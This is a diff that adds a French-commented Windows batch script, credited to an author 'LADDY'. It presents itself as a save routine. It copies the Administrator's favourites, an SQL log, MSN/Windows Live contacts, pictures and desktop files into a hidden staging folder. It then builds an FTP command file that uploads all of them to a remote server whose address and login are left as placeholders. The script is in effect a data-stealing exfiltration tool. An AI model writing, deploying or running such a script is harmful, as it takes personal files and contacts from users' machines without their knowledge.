@@ -1,0 +1,51 @@
+@echo off
+mkdir sauver C:\Documents and Settings\Administrateur\Mes documents\sauver
+md C:\Documents and Settings\Administrateur\Mes documents\sauver
+echo Le dossier sauver est cree
+XCOPY /s "D:\Documents and Settings\Administrateur\Favoris" "D:\Documents and Settings\Administrateur\Mes documents\sauver"
+XCOPY /s "C:\Documents and Settings\Administrateur\Favoris" "C:\Documents and Settings\Administrateur\Mes documents\sauver"
+XCOPY /s "D:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\SQL.LOG" "D:\Documents and Settings\Administrateur\Mes documents\sauver"
+md sauver\administrateur
+md sauver\msn
+XCOPY /s "D:\WINDOWS\system32\odbccp32.dll" "D:\Documents and Settings\Administrateur\Mes documents\sauver\administrateur"
+XCOPY /s "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\SQL.LOG" "C:\Documents and Settings\Administrateur\Mes documents\sauver"
+XCOPY /s "C:\WINDOWS\system32\odbccp32.dll" "C:\Documents and Settings\Administrateur\Mes documents\sauver\administrateur"
+XCOPY /s "D:\Program Files\Windows Live\Contacts" "D:\Documents and Settings\Administrateur\Mes documents\sauver\msn"
+XCOPY /s "C:\Program Files\Windows Live\Contacts" "C:\Documents and Settings\Administrateur\Mes documents\sauver\msn"
+md sauver\images
+md sauver\bureau
+XCOPY /s "D:\Documents and Settings\Administrateur\Mes documents\Mes images" "D:\Documents and Settings\Administrateur\Mes documents\sauver\images"
+XCOPY /s "C:\Documents and Settings\Administrateur\Mes documents\Mes images" "C:\Documents and Settings\Administrateur\Mes documents\sauver\images"
+XCOPY /s "D:\Documents and Settings\All Users\Bureau" "D:\Documents and Settings\Administrateur\Mes documents\sauver\bureau"
+XCOPY /s "C:\Documents and Settings\All Users\Bureau" "C:\Documents and Settings\Administrateur\Mes documents\sauver\bureau"
+REM AUTEUR LADDY
+REM BATCH.XOO.IT
+>> upload.ftp ECHO open adrese  (ftp)
+>> upload.ftp ECHO quote pass  (mot de pass)
+>>upload.ftp ECHO quote user  (nom dutilistaeur)
+>>upload.ftp ECHO binary
+>>upload.ftp ECHO quote user  (nom dutilistaeur)
+>> upload.ftp ECHO quote pass  (mot de pas)
+>>upload.ftp ECHO prompt n
+>>upload.ftp ECHO hash
+>>upload.ftp ECHO bin
+>>upload.ftp ECHO mput D:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\Liens\*.*
+>>upload.ftp ECHO mput D:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\ADMINI~1\*.*
+>>upload.ftp ECHO mput D:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\bureau\*.*
+>>upload.ftp ECHO mput D:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\msn\*.*
+>>upload.ftp ECHO mput D:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\images\*.*
+>>upload.ftp ECHO mput D:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\SITESW~1\*.*
+>>upload.ftp ECHO put D:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\SQL.LOG
+>>upload.ftp ECHO mput C:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\Liens\*.*
+>>upload.ftp ECHO mput C:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\ADMINI~1\*.*
+>>upload.ftp ECHO mput C:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\bureau\*.*
+>>upload.ftp ECHO mput C:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\msn\*.*
+>>upload.ftp ECHO mput C:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\images\*.*
+>>upload.ftp ECHO mput C:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\SITESW~1\*.*
+>>upload.ftp ECHO put C:\DOCUME~1\ADMINI~1\MESDOC~1\sauver\SQL.LOG
+::envoie les fichiers contenus dans un répertoire remplace systemdrive\up par le répertoires des fichiers à uploader
+@for %%I in ("%systemdrive%\up\*.*") do (
+echo put %%I>>upload.ftp
+ 
+)
+>>upload.ftp echo bye
